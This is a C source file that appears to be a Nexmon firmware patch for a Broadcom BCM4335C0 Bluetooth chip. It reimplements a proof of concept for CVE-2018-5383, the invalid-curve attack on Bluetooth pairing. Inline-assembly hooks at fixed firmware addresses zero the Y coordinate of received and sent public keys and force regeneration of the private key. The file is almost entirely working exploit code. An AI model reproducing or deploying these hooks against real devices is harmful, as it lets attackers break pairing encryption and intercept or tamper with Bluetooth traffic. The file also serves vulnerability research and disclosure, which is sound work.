
/*
 * Assembly and structure taken from: 
 * https://github.com/seemoo-lab/internalblue/blob/master/examples/CVE_2018_5383_Invalid_Curve_Attack_PoC.py
 */

#define PK_RECV_HOOK_ADDRESS 0x2FED8
#define PK_SEND_HOOK_ADDRESS 0x030098
#define GEN_PRIV_KEY_ADDRESS 0x48eba
#define HOOKS_LOCATION 0xd7800

#pragma NEXMON targetregion "patch"
#include <firmware_version.h>
#include <patcher.h>

__attribute__((at(HOOKS_LOCATION, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
__attribute__((optimize("O0")))
void pk_recv_hook(void) {
	__asm__(  "nop\n\t"
		"push {r0-r3,lr}\n\t"
	    "strb.w  r0, [r4, 170]\n\t"
	    "ldr r0, =0x205614\n\t"
	    "mov r1, 6\n\t"
	    "mov r2, 0\n"
	  "loop1:\n\t"
	    "str r2, [r0]\n\t"
	    "add r0, 4\n\t"
	    "subs r1, 1\n\t"
	    "bne  loop1\n\t"
	    "pop {r0-r3,pc}\n");
}

__attribute__((at(PK_RECV_HOOK_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
BLPatch(pk_recv_hook, pk_recv_hook + 1);


__attribute__((at(HOOKS_LOCATION + 50, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
__attribute__((optimize("O0")))
void pk_send_hook(void){
  __asm__( "nop\n\t"
	   "add r2, r0, 24\n\t"
	   "mov r3, 0\n\t"
	   "mov r1, 6\n"
	  "loop2:\n\t"
	   "str r3, [r2]\n\t"
	   "add r2, 4\n\t"
	   "subs r1, 1\n\t"
	   "bne  loop2\n\t"
	   "b 0x2FFC4");

}

//__attribute__((at(PK_SEND_HOOK_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
//BLPatch(pk_send_hook, pk_send_hook + 1)


__attribute__((at(HOOKS_LOCATION + 100, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
__attribute__((optimize("O0")))
void gen_priv_key_hook(void){
  __asm__( "nop\n\t"
	   "push {r4,lr}\n\t"
	   "mov r3, r0\n\t"
	   "mov r4, r1\n"
	  "generate:\n\t"
	   "mov r0, r3\n\t"
	   "mov r1, r4\n\t"
	   "bl 0x48E96\n\t"  // generate new priv key
	   "ldr  r2, [r3]\n\t"
	   "ands r2, 0x1\n\t"
	   "bne generate\n\t"
	   "pop  {r4,pc}\n\t");
}

//__attribute__((at(GEN_PRIV_KEY_ADDRESS, "", CHIP_VER_BCM4335C0_BT, FW_VER_1_BT)))
//BLPatch(gen_priv_key_hook, gen_priv_key_hook + 1)

